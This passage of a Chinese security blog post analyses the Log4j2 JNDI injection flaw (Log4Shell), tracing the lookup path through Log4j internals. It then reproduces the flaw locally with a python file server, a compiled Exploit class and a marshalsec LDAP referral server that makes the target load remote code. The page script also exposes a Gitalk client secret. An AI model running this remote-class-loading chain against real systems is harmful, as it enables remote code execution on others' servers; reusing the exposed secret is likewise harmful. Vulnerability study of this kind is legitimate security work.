+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhoged1ywj21050ckmyi.jpg" alt="image-20220218135943893"></p>
+<p>上面跟进的流程，大致是流程就是判断日志开启，参数化，打印策略，加锁等</p>
+<p>后续是 本次漏洞的关键点。</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhogktvbej20qu0ljdj9.jpg" alt="image-20220218140611381"></p>
+<p>this.getlayout 是 PatternLayout 对象（处理日志格式对象），这里调用 PatternLayout 对象中的 encode 对日志进行处理</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhogct62ij21440jljxs.jpg" alt="image-20220218141258031"></p>
+<p>toText 传递了两个参数</p>
+<ul>
+<li>this.eventSerializer 是处理日志的 11 个 formatters 对象 <ul>
+<li>org.apache.logging.log4j.core.pattern.DatePatternConverter </li>
+<li>org.apache.logging.log4j.core.pattern.LiteralPatternConverter </li>
+<li>org.apache.logging.log4j.core.pattern.ThreadNamePatternConverter </li>
+<li>org.apache.logging.log4j.core.pattern.LevelPatternConverter </li>
+<li>org.apache.logging.log4j.core.pattern.LoggerPatternConverter </li>
+<li>org.apache.logging.log4j.core.pattern.MessagePatternConverter (重点)</li>
+<li>org.apache.logging.log4j.core.pattern.LineSeparatorPatternConverter</li>
+<li> org.apache.logging.log4j.core.pattern.ExtendedThrowablePatternConverter</li>
+</ul>
+</li>
+<li>日志信息</li>
+</ul>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhogo1hfdj212r0ae0u1.jpg" alt="image-20220218141803763"></p>
+<p>遍历不同的 formatters 对象处理日志信息，此次漏洞点就是在 MessagePatternConverter 对象中</p>
+<p>循环进入第八次时，跟进 format </p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhogbv4y5j21u20gan02.jpg" alt="image-20220216083233931"></p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhoghzjnaj214k0fvwhu.jpg" alt="image-20220218142217976"></p>
+<p>this.noLookoups 为 false 即支持 jndi</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhogf5g36j210t0g7mzm.jpg" alt="image-20220218142834755"></p>
+<p>这里匹配到 ${ 后，将内容交给 workingBuilder.append 匹配替换，跟进 workingBuilder.append</p>
+<p>继续跟进 substitute </p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhogaxhb0j20xa07lt9t.jpg" alt="image-20220218142912425"></p>
+<p>这里是将 <code>${</code> <code>}</code> <code>[:,-]</code> 字符给替换成空了</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhogh5ifoj214x0le42y.jpg" alt="image-20220218143525399"></p>
+<p>然后循环递归提取 ${} 中的内容</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhogglvidj21450iq76v.jpg" alt="image-20220218144211635"></p>
+<p>提取完内容后交由 resolveVariable 处理,跟进</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhog8kzi4j212j0ghmzq.jpg" alt="image-20220218144904632"></p>
+<p>getVariableResolver 是 interplator 对象 ，包含 3个 map</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhog9htfzj20mu0hntae.jpg" alt="image-20220218145212375"></p>
+<p>其中 strLookup 将一些 lookup 功能关键字和对应的实例类进行了映射</p>
+<p>后面调用  resolver.lookup 处理，跟进</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhogn458rj21co0lbjvp.jpg" alt="image-20220218145727250"></p>
+<p>这里截取 jndi 跟进 jndi 获取到对应的 JndiLookup对象，然后调用 jndi 对象的 lookup 处理 payload 信息</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhogbe2p4j215s0m8777.jpg" alt="image-20220218150354162"><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhogp0njcj215s0m8777.jpg" alt="image-20220218150354530"></p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhogjsgu9j20g20brjrj.jpg" alt="image-20220218150416516"></p>
+<p>执行了恶意类，计算机反弹成功。</p>
+<p>有些地方还是有些懵逼，大致了解的差不多了, 后续还需要深入学习一下</p>
+<h1 id="0X06-漏洞复现"><a href="#0X06-漏洞复现" class="headerlink" title="0X06 漏洞复现"></a>0X06 漏洞复现</h1><p>marshalsec下载地址：<a target="_blank" rel="noopener" href="https://github.com/mbechler/marshalsec">https://github.com/mbechler/marshalsec</a>   需自行编译成 jar 包</p>
+<p>编译好的下载地址：<a target="_blank" rel="noopener" href="https://gitee.com/fcncdn/marshalsec-0.0.3/raw/master/marshalsec-0.0.3-SNAPSHOT-all.jar">https://gitee.com/fcncdn/marshalsec-0.0.3/raw/master/marshalsec-0.0.3-SNAPSHOT-all.jar</a></p>
+<p>在 java 目录下启个服务，得是 Exploit.java 目录，方便获取到恶意攻击类文件</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">python3 -m http.server 83</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhogeqnt2j20h9028glr.jpg" alt="image-20220215123103796"></p>
+<p>生成 class </p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">javac Expload</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhogafh93j20a103t3yg.jpg" alt="image-20220215123050606"></p>
+<p>使用 marshalsec 开启 ldap 服务</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:83/\#Exploit</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhogl6xd9j210501o3yq.jpg" alt="image-20220215123151296"></p>
+<p>注意：exp 默认执行的是 cmd1 弹出 计算器, 如果你是 mac 要注意计算器的目录，有些可能和exp中目录不一致导致计算器弹不出来。。</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhoghg7pyj20xq0ctq4n.jpg" alt="image-20220215123344212"></p>
+<p>做完准备工作后，运行 Test</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhogg48plj21ay0j0afn.jpg" alt="image-20220215123438294"></p>
+<p>反弹成功</p>
+<h1 id="0X07-参考链接"><a href="#0X07-参考链接" class="headerlink" title="0X07 参考链接"></a>0X07 参考链接</h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9261">https://xz.aliyun.com/t/9261</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9053">https://xz.aliyun.com/t/9053</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/angry_program/article/details/121994740">https://blog.csdn.net/angry_program/article/details/121994740</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/263325">https://www.anquanke.com/post/id/263325</a></p>
+<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1787/">https://paper.seebug.org/1787/</a></p>
+<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1786/">https://paper.seebug.org/1786/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/dengyungao/p/7524902.html">https://www.cnblogs.com/dengyungao/p/7524902.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/piaomiaohongchen/p/15711310.html">https://www.cnblogs.com/piaomiaohongchen/p/15711310.html</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Time</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://timeshu.github.io/2022/02/09/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Log4j2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">https://timeshu.github.io/2022/02/09/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Log4j2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://TimeSHU.github.io" target="_blank">Time'Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/JAVA/">JAVA</a></div><div class="post_share"><div class="social-share" data-image="https://images.pexels.com/photos/8761731/pexels-photo-8761731.jpeg?auto=compress&amp;cs=tinysrgb&amp;dpr=2&amp;w=500" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/02/20/%E5%90%91%E6%97%A5%E8%91%B5RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><img class="prev-cover" src="https://images.pexels.com/photos/10643916/pexels-photo-10643916.jpeg?auto=compress&amp;cs=tinysrgb&amp;dpr=2&amp;h=750&amp;w=1260" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">向日葵RCE漏洞复现</div></div></a></div><div class="next-post pull-right"><a href="/2022/01/25/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-shiro-721%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BA%94/"><img class="next-cover" src="https://images.pexels.com/photos/10651587/pexels-photo-10651587.jpeg?auto=compress&amp;cs=tinysrgb&amp;dpr=2&amp;w=500" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Java反序列化-shiro-721反序列化(五)</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/02/23/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-OFCMS/" title="Java代码审计-OFCMS"><img class="cover" src="https://images.pexels.com/photos/10620135/pexels-photo-10620135.jpeg?auto=compress&cs=tinysrgb&dpr=2&w=500" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-02-23</div><div class="title">Java代码审计-OFCMS</div></div></a></div><div><a href="/2022/01/15/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-MCMS/" title="Java代码审计-MCMS"><img class="cover" src="https://images.pexels.com/photos/10631545/pexels-photo-10631545.jpeg?auto=compress&cs=tinysrgb&dpr=2&h=750&w=1260" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-15</div><div class="title">Java代码审计-MCMS</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="gitalk-container"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0X01-Log4j2-%E7%BB%84%E4%BB%B6"><span class="toc-number">1.</span> <span class="toc-text">0X01 Log4j2 组件</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0X02-RMI"><span class="toc-number">2.</span> <span class="toc-text">0X02 RMI</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#RMI-%E6%A6%82%E5%BF%B5"><span class="toc-number">2.1.</span> <span class="toc-text">RMI 概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RMI-%E4%B8%89%E5%B1%82%E6%9E%B6%E6%9E%84"><span class="toc-number">2.2.</span> <span class="toc-text">RMI 三层架构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E4%BE%8B%E5%AD%90"><span class="toc-number">2.3.</span> <span class="toc-text">代码例子</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E9%85%8D%E7%BD%AE"><span class="toc-number">2.3.1.</span> <span class="toc-text">服务端配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%85%8D%E7%BD%AE"><span class="toc-number">2.3.2.</span> <span class="toc-text">客户端配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4%E4%BB%A3%E7%A0%81"><span class="toc-number">2.3.3.</span> <span class="toc-text">完整代码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0X03-JNDI"><span class="toc-number">3.</span> <span class="toc-text">0X03 JNDI</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#JNDI-%E6%B3%A8%E5%85%A5"><span class="toc-number">3.1.</span> <span class="toc-text">JNDI 注入</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0X04-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">4.</span> <span class="toc-text">0X04 环境搭建</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0X05-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">5.</span> <span class="toc-text">0X05 漏洞分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0X06-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">6.</span> <span class="toc-text">0X06 漏洞复现</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0X07-%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">7.</span> <span class="toc-text">0X07 参考链接</span></a></li></ol></div></div></div></div></main><footer id="footer" style="background-image: url('https://images.pexels.com/photos/8761731/pexels-photo-8761731.jpeg?auto=compress&amp;cs=tinysrgb&amp;dpr=2&amp;w=500')"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2022 By Time</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi, welcome to my <a href="https://timeshu.github.io">blog</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font-plus" type="button" title="放大字体"><i class="fas fa-plus"></i></button><button id="font-minus" type="button" title="缩小字体"><i class="fas fa-minus"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><div class="js-pjax"><script>function addGitalkSource () {
+  const ele = document.createElement('link')
+  ele.rel = 'stylesheet'
+  ele.href= 'https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css'
+  document.getElementsByTagName('head')[0].appendChild(ele)
+}
+
+function loadGitalk () {
+  function initGitalk () {
+    var gitalk = new Gitalk(Object.assign({
+      clientID: '7296bb0c658f7e8397b9',
+      clientSecret: 'f7701c96a690160dfb9a85fcc00e6ce7bc03a971',
+      repo: 'blog-comments',
+      owner: 'TimeSHU',
+      admin: ['TimeSHU'],
+      id: '8cbb1bc062fb8afa7a27737e2b92b45b',
+      language: 'zh-CN',
+      perPage: 10,
+      distractionFreeMode: false,
+      pagerDirection: 'last',
+      createIssueManually: false,
+      updateCountCallback: commentCount
+    },null))
+
+    gitalk.render('gitalk-container')
+  }
+
+  if (typeof Gitalk === 'function') initGitalk()
+  else {
+    addGitalkSource()
+    getScript('https://cdn.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.js').then(initGitalk)
+  }
+}
+
+function commentCount(n){
+  let isCommentCount = document.querySelector('#post-meta .gitalk-comment-count')
+  if (isCommentCount) {
+    isCommentCount.innerHTML= n
+  }
+}
+
+if ('Gitalk' === 'Gitalk' || !false) {
+  if (false) btf.loadComment(document.getElementById('gitalk-container'), loadGitalk)
+  else loadGitalk()
+} else {
+  function loadOtherComment () {
+    loadGitalk()
+  }
+}</script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
